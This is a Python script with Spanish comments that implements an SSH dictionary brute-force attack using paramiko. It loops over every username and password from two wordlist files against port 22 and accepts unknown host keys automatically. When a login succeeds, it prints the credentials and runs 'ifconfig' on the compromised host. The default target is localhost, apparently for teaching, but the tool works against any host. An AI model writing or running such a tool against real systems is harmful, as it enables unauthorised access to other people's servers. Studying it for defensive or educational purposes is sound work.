import paramiko  # Biblioteca para conexiones SSH
import socket  # Biblioteca para manejar errores relacionados con la red
import sys  # Biblioteca para interactuar con el sistema (como salir del script)

class SSHConnection:
    """
    Clase para manejar conexiones SSH y realizar ataques de fuerza bruta
    utilizando un archivo de diccionario de usuarios y contraseñas.
    """

    def __init__(self):
        """
        Inicializa un cliente SSH usando Paramiko.
        """
        self.sshClient = paramiko.SSHClient()

    def conexion_ssh(self, ip, usuario, password, code=0):
        """
        Intenta establecer una conexión SSH con las credenciales dadas.

        Args:
            ip (str): Dirección IP o nombre del host.
            usuario (str): Nombre de usuario para intentar la conexión.
            password (str): Contraseña para intentar la conexión.
            code (int): Código para representar el estado de la conexión.

        Returns:
            int: Código de estado de la conexión:
                0 -> Conexión exitosa.
                1 -> Fallo de autenticación.
                2 -> Error de conexión con el host.
        """
        # Configura el cliente SSH para agregar claves automáticamente si no están presentes
        self.sshClient.load_system_host_keys()
        self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print("[*] Comprobando usuario y password con fichero diccionario ")
        print("[*] Usuario: %s" % (usuario))
        print("[*] Password :%s" % (password))

        try:
            # Intenta conectarse al servidor SSH
            self.sshClient.connect(ip, port=22, username=usuario, password=password, timeout=5)
        except paramiko.AuthenticationException:
            # Fallo en la autenticación
            code = 1
            self.sshClient.close()
        except socket.error as exception:
            # Error al conectar al host
            code = 2
            self.sshClient.close()

        return code

    def fuerza_bruta_SSH(self, host):
        """
        Realiza un ataque de fuerza bruta SSH usando un archivo de diccionario
        de usuarios y contraseñas.

        Args:
            host (str): Dirección IP o nombre del host del servidor SSH.
        """
        try:
            # Abrir los archivos de usuarios y contraseñas
            usuarios_file = open("usuarios.txt", 'r')
            passwords_file = open("passwords.txt", 'r')

            # Leer las líneas de los archivos
            usuarios = usuarios_file.readlines()
            passwords = passwords_file.readlines()

            print(usuarios)
            print(passwords)

            # Itera sobre cada usuario y contraseña
            for user in usuarios:
                for password in passwords:
                    # Quita saltos de línea o espacios innecesarios
                    user_text = user.rstrip()
                    password_text = password.rstrip()

                    try:
                        # Intenta conectarse usando las credenciales actuales
                        response = self.conexion_ssh(host, user_text, password_text)

                        if response == 0:
                            # Conexión exitosa
                            print("[*] Usuario: %s [*] Pass encontrados: %s" % (user_text, password_text))
                            print(self.sshClient)

                            # Ejecuta el comando `ifconfig` en el servidor remoto
                            stdin, stdout, stderr = self.sshClient.exec_command("ifconfig")
                            for line in stdout.readlines():
                                print(line.strip())

                            # Salir del script al encontrar credenciales válidas
                            sys.exit(0)
                        elif response == 1:
                            # Credenciales incorrectas
                            print("[*] Login incorrecto")
                        elif response == 2:
                            # Error de conexión con el host
                            print("[*] Conexión no se ha podido establecer con el host %s" % (host))
                            sys.exit(2)
                    except Exception as exception:
                        # Manejo genérico de errores durante la conexión SSH
                        print("Error conexión SSH ", exception)

            # Cerrar los archivos después de terminar
            usuarios_file.close()
            passwords_file.close()

        except Exception as exception:
            # Manejo de errores al abrir los archivos de usuarios/contraseñas
            print("Archivos usuarios.txt / passwords.txt no encontrados", exception)

if __name__ == '__main__':
    # Instancia de la clase SSHConnection
    sshConnection = SSHConnection()

    # Llama al método para realizar fuerza bruta sobre el host especificado
    sshConnection.fuerza_bruta_SSH('localhost')
